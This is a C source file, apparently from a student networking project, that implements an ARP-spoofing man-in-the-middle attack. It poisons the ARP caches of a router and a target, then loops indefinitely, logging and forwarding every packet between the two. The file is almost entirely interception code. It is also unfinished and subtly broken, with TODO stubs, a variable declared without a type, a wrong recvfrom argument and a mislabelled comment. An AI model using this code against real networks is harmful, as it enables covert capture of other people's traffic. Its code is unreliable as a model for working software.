
# include <ft_malcolm.h>
# include <arp.h>

# include <signal.h>

# include <string.h> // USE MINE ...

# define SADDRVALUETO_SADDRIN(x) (*(struct sockaddr_in*)&(x))

static err_t forward_packet(int sockfd, uint8_t* const packet, ssize_t packetlen, const struct sockaddr* dest)
{
    err_t st = SUCCESS;

    const sentbytes = sendto(sockfd, packet, packetlen, 0, dest, sizeof(*dest));

    if (sentbytes < 0)
    {
        ///TODO: Print some error
        st = INVSYSCALL;
    }
    else if (sentbytes != packetlen)
    {
        ///TODO: Print something like: "bytes sent != received exit"
        st = INVPACKETLEN;
    }
    return st;
}

err_t   man_of_the_midle(const char* av[], const proginfo_t* const info, volatile sig_atomic_t* unpoinson)
{
    err_t st = SUCCESS;

    ///TODO: Parse router & optional flags at the end

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    if ((st = spoof_router(info)) != SUCCESS)
        goto error;

    /* Try to always unpoison target & router if the program is interrupted */ 
    *unpoinson = true;

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    if ((st = spoof_target(info)) != SUCCESS)
        goto error;

    struct sockaddr sinfo;
    ssize_t recvbytes = 0;
    static uint8_t buff[0X10000];

    for ( ; ; )
    {
        if ((recvbytes = recvfrom(info->sockrecv, buff, sizeof(buff) / sizeof(*buff), 0, &sinfo, sizeof(sinfo))) < 0)
        {
            ///TODO: Some error msg
            st = INVSYSCALL;
            goto error;
        }

        /* Supports only IPv4 for the moment */
        if (SADDRVALUETO_SADDRIN(sinfo).sin_family != AF_INET)
            continue ;

        /* (filter) Log/[modify]/forward only packet from target or router */
        if (SADDRVALUETO_SADDRIN(sinfo).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->router.addr).sin_addr.s_addr)
        {
            log_content(buff, recvbytes);
            if ((st = forward_packet(info->socksend, buff, recvbytes, (const struct sockaddr*)&info->target.addr)) != SUCCESS)
                goto error;
        }
        else if (SADDRVALUETO_SADDRIN(sinfo).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->target.addr).sin_addr.s_addr)
        {
            log_content(buff, recvbytes);
            if ((st = forward_packet(info->socksend, buff, recvbytes, (const struct sockaddr*)&info->router.addr)) != SUCCESS)
                goto error;
        }

        memset(buff, 0, recvbytes);
    }

error:
    return st;
}